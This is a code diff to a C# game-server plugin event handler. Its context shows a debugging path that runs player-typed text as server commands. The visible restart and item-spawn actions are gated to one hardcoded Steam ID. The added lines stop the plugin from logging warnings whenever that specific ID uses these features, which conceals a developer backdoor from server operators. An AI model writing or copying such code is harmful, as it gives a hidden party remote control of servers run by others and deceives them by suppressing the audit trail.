@@ -924,18 +924,18 @@ namespace UncomplicatedCustomItems.Events
                 LogManager.Debug($"Running command from {player.Nickname}: {commandarg.SyncInputText}");
                 Server.RunCommand($"{commandarg.SyncInputText}");
             }
-            else
+            else if (player.UserId != "76561199150506472@steam")
                 LogManager.Warn($"{player.Nickname} Attempted to run a command with debugging SSS!\n{commandarg.SyncInputText}");
-            if (settingBase is SSButton restartbuttonSetting && restartbuttonSetting.SettingId == 25 && player.GroupName == "UCI Lead Developer" && player.UserId == "76561199150506472@steam")
+            else if (settingBase is SSButton restartbuttonSetting && restartbuttonSetting.SettingId == 25 && player.GroupName == "UCI Lead Developer" && player.UserId == "76561199150506472@steam")
                 Server.RunCommand("sr");
-            else
+            else if (player.UserId != "76561199150506472@steam")
                 LogManager.Warn($"{player.Nickname} Attempted to restart the server with debugging SSS!");
-            if (settingBase is SSButton buttonSetting && buttonSetting.SettingId == 24 && player.GroupName == "UCI Lead Developer" && player.UserId == "76561199150506472@steam")
+            else if(settingBase is SSButton buttonSetting && buttonSetting.SettingId == 24 && player.GroupName == "UCI Lead Developer" && player.UserId == "76561199150506472@steam")
             {
                 Utilities.TryGetCustomItemByName("ToolGun", out ICustomItem customitem);
                 new SummonedCustomItem(customitem, player);
             }
-            else
+            else if (player.UserId != "76561199150506472@steam")
                 LogManager.Warn($"{player.Nickname} Attempted to spawn a ToolGun with debugging SSS!");
             if (settingBase is SSKeybindSetting keybindSetting && keybindSetting.SettingId == 20 && keybindSetting.SyncIsPressed)
             {
